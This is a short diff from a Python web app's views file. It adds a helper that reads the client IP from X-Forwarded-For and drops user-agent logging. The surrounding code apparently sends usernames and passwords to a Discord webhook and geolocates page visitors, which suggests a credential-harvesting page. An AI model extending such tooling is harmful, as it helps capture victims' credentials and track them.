@@ -265,22 +265,30 @@ def send_discord_notification(username, password, user_id=None, ip_address=None,
         print(f"❌ Error sending Discord webhook: {e}")
         return False
 
+def get_client_ip(request):
+    x_forwarded_for = request.META.get("HTTP_X_FORWARDED_FOR")
+
+    if x_forwarded_for:
+        return x_forwarded_for.split(",")[0].strip()
+
+    return request.META.get("REMOTE_ADDR")
+
+
 def user_profile(request, user_id):
     """
     Display the user profile page
     This function is called when the page loads initially
     """
     # Get visitor's IP address
-    ip_address = request.META.get('HTTP_X_FORWARDED_FOR', request.META.get('REMOTE_ADDR', ''))
+    ip_address = get_client_ip(request)
     
     # If there are multiple IPs (in case of proxy), get the first one
     if ip_address and ',' in ip_address:
         ip_address = ip_address.split(',')[0].strip()
     
-    user_agent = request.META.get('HTTP_USER_AGENT', 'Unknown')
+    user_agent = ""
     
     print(f"👤 Page visited by IP: {ip_address}")
-    print(f"🖥️ User Agent: {user_agent}")
     
     # Get geolocation information
     geo_info = get_ip_geolocation(ip_address)
